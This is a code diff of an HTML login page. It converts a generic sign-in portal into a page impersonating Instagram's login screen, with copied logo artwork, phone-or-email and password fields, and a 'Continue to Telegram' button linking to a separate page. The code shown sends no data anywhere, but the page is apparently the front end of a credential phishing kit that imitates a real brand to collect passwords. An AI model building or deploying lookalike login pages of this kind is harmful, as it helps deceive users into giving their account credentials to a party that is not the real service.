@@ -1,46 +1,92 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Secure Authentication Portal</title>
-  <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram • Login</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="stylesheet" href="style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
 </head>
-<body>
-  <div class="auth-container">
-    <div class="auth-card">
-      <h2>Sign In</h2>
-      <p class="subtitle">Choose your preferred identity provider</p>
+<body class="bg-slate-950 text-slate-100 font-['Inter'] min-h-screen flex flex-col justify-between items-center p-4">
+
+  <main class="flex-1 flex items-center justify-center w-full max-w-4xl py-8">
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-8 items-center w-full">
       
-      <div class="social-buttons">
-        <button class="btn btn-social btn-provider-a" onclick="handleOAuthRedirect('ProviderA')">
-          Continue with Identity Provider A
-        </button>
-        <button class="btn btn-social btn-provider-b" onclick="handleOAuthRedirect('ProviderB')">
-          Continue with Identity Provider B
-        </button>
-        <button class="btn btn-social btn-provider-c" onclick="handleOAuthRedirect('ProviderC')">
-          Continue with Social Auth
-        </button>
+      <!-- Left: Phone Preview Mockup -->
+      <div class="hidden md:flex justify-center items-center relative">
+        <div class="w-72 h-[550px] bg-slate-900 rounded-[40px] border-8 border-slate-800 shadow-2xl overflow-hidden relative p-3 flex flex-col justify-between">
+          <div class="w-32 h-5 bg-slate-800 rounded-b-xl mx-auto z-10"></div>
+          <div class="flex-1 rounded-[28px] overflow-hidden relative my-2 bg-gradient-to-b from-indigo-900/40 via-purple-900/30 to-slate-900 flex flex-col items-center justify-center p-6 text-center border border-indigo-500/20">
+            <div class="w-16 h-16 rounded-2xl bg-gradient-to-tr from-yellow-500 via-pink-500 to-purple-600 flex items-center justify-center shadow-lg mb-4 animate-pulse">
+              <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" />
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" />
+              </svg>
+            </div>
+            <h3 class="font-bold text-lg text-white mb-1">Connect & Share</h3>
+            <p class="text-xs text-slate-400">Experience the seamless bridge between social platforms.</p>
+          </div>
+          <div class="w-24 h-1 bg-slate-700 rounded-full mx-auto mb-1"></div>
+        </div>
       </div>
 
-      <div class="divider"><span>OR</span></div>
+      <!-- Right: Login Card -->
+      <div class="w-full max-w-sm mx-auto space-y-4">
+        <div class="bg-slate-900/80 backdrop-blur-md border border-slate-800 rounded-2xl p-8 shadow-xl text-center space-y-6">
+          <!-- Instagram Logo Header -->
+          <div class="flex justify-center items-center space-x-2 pt-2">
+            <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-amber-400 via-rose-500 to-purple-600 p-0.5 flex items-center justify-center shadow-md">
+              <div class="w-full h-full bg-slate-900 rounded-[10px] flex items-center justify-center">
+                <svg class="w-6 h-6 text-white" fill="currentColor" viewBox="0 0 24 24">
+                  <path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z"/>
+                </svg>
+              </div>
+            </div>
+            <span class="text-2xl font-bold tracking-tight bg-gradient-to-r from-white via-slate-200 to-slate-400 bg-clip-text text-transparent">Instagram</span>
+          </div>
 
-      <form id="loginForm" onsubmit="handleStandardLogin(event)">
-        <div class="input-group">
-          <label for="username">Username or Email</label>
-          <input type="text" id="username" required autocomplete="username">
-        </div>
-        <div class="input-group">
-          <label for="password">Password</label>
-          <input type="password" id="password" required autocomplete="current-password">
-        </div>
-        <button type="submit" class="btn btn-primary">Log In</button>
-      </form>
+          <!-- Standard Form -->
+          <form id="loginForm" class="space-y-3 pt-2" onsubmit="event.preventDefault();">
+            <input type="text" placeholder="Phone number, username, or email" required class="w-full px-4 py-2.5 bg-slate-950/70 border border-slate-800 rounded-lg text-sm text-slate-100 placeholder-slate-500 focus:outline-none focus:border-sky-500 transition-all" />
+            <input type="password" placeholder="Password" required class="w-full px-4 py-2.5 bg-slate-950/70 border border-slate-800 rounded-lg text-sm text-slate-100 placeholder-slate-500 focus:outline-none focus:border-sky-500 transition-all" />
+            <button type="submit" class="w-full py-2.5 bg-sky-600 hover:bg-sky-500 text-white font-semibold text-sm rounded-lg shadow-lg shadow-sky-600/20 transition-all cursor-pointer active:scale-[0.98]">Log in</button>
+          </form>
 
-      <div id="statusMessage" class="status-message"></div>
+          <div class="relative flex items-center justify-center my-4">
+            <div class="border-t border-slate-800 w-full"></div>
+            <span class="bg-slate-900 px-3 text-xs text-slate-500 font-semibold tracking-wider uppercase absolute">OR</span>
+          </div>
+
+          <!-- Continue to Telegram Redirect Section -->
+          <div class="pt-1 space-y-3">
+            <p class="text-xs text-slate-400">Already signed in on Telegram?</p>
+            <a href="telegram.html" id="continueBtn" class="group w-full py-3 px-4 bg-gradient-to-r from-sky-500 to-blue-600 hover:from-sky-400 hover:to-blue-500 text-white font-semibold text-sm rounded-xl shadow-lg shadow-sky-500/25 flex items-center justify-center space-x-2 transition-all transform hover:-translate-y-0.5 active:translate-y-0 cursor-pointer">
+              <svg class="w-5 h-5 fill-current text-white transform group-hover:scale-110 transition-transform" viewBox="0 0 24 24">
+                <path d="M12 0C5.37 0 0 5.37 0 12s5.37 12 12 12 12-5.37 12-12S18.63 0 12 0zm5.56 8.16l-1.97 9.28c-.15.68-.55.84-1.12.52l-3.01-2.22-1.45 1.4c-.16.16-.3.3-.61.3l.21-3.05 5.56-5.02c.24-.22-.05-.34-.37-.13l-6.87 4.33-2.96-.92c-.64-.2-.65-.64.13-.95l11.57-4.46c.53-.19 1 .13.89.92z"/>
+              </svg>
+              <span>Continue to Telegram</span>
+              <svg class="w-4 h-4 ml-1 transform group-hover:translate-x-1 transition-transform" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M14 5l7 7m0 0l-7 7m7-7H3" />
+              </svg>
+            </a>
+          </div>
+
+          <a href="#" class="inline-block text-xs text-sky-400 hover:underline pt-1">Forgot password?</a>
+        </div>
+
+        <!-- Bottom Signup Card -->
+        <div class="bg-slate-900/80 backdrop-blur-md border border-slate-800 rounded-xl p-4 text-center text-xs text-slate-400">
+          Don't have an account? <a href="#" class="text-sky-400 font-semibold hover:underline">Sign up</a>
+        </div>
+      </div>
     </div>
-  </div>
+  </main>
+
+  <footer class="py-4 text-center text-xs text-slate-600">
+    <p>&copy; 2025 Instagram & Telegram Authentication Suite</p>
+  </footer>
+
   <script src="app.js"></script>
 </body>
 </html>
